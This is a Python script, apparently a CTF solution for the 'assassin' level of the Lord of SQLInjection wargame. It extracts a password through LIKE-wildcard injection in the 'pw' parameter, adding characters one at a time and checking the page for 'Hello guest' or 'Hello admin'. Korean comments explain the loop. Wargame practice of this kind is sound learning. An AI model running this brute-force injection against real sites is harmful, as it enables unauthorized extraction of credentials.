import urllib3
import requests


url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력
Done = False

Answer = []

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

for i in ch:
    query = i + "%"
    req = requests.get(url+query, headers=header)
    #print(url+query)

    if i != '%' and i != '_':
        if 'Hello guest' in req.text:
            Answer.append(i)
            break
        else:
            pass

print('[+] Find Init Words : ', Answer)

while not Done:
    tmpList = []

    for j in Answer:
        for i in ch:
            query = j + i + "%"
            req = requests.get(url+query, headers=header)
            #print(url+query) <--잘 돌아가는 지 확인하려고 넣은 print문

            if i != '%' and i != '_':
                if 'Hello guest' in req.text:
                    tmpList.append(j+i)
                    #print("append letter ", tmpList) <--잘 돌아가는지 확인하려고 넣은 print
                elif 'Hello admin' in req.text:
                    print('[+] Find Last Answer : ', query)
                    Done = True
                    break
                else:
                    pass
    if not Done:
        print('[+] Current tmpList : ', tmpList)

    Answer = tmpList #여기서 tmpList의 글자가 Answer로 보내져서 Answer부분에 글자가 늘어난다.
    # 예) 90%해서 Hello guest가 오면 90을 Answer로 보내준다.
                
